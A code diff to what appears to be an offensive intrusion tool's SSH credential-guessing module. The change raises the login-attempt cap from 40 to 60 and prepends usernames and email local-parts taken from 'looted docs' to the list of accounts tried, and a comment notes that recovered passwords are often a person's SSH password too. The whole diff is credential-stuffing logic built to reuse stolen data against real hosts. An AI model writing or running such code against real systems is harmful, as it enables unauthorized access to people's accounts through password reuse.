@@ -54,7 +54,7 @@ def run(host: HostReport, opts) -> None:
     for pw in creds:
         for user in users:
             tried += 1
-            if tried > 40:
+            if tried > 60:
                 return
             if not _login_ok(ip, user, pw):
                 continue
@@ -92,6 +92,15 @@ def _login_ok(ip: str, user: str, pw: str) -> bool:
 
 def _candidate_users(host: HostReport) -> List[str]:
     users = list(_SVC_USERS)
+    # Usernames derived from looted docs (naming convention, names) and mailbox
+    # candidates — the recovered password is often a person's SSH password too.
+    for u in sorted(host.__dict__.get("usernames", set())):
+        if u not in users:
+            users.insert(0, u)
+    for e in host.__dict__.get("emails", set()):
+        local = e.split("@", 1)[0]
+        if local and local not in users:
+            users.insert(0, local)
     # Usernames scryer already saw (DB creds, email leaks) go first.
     for f in host.findings:
         if f.title.startswith("DB credential") or "SSH access" in f.title:
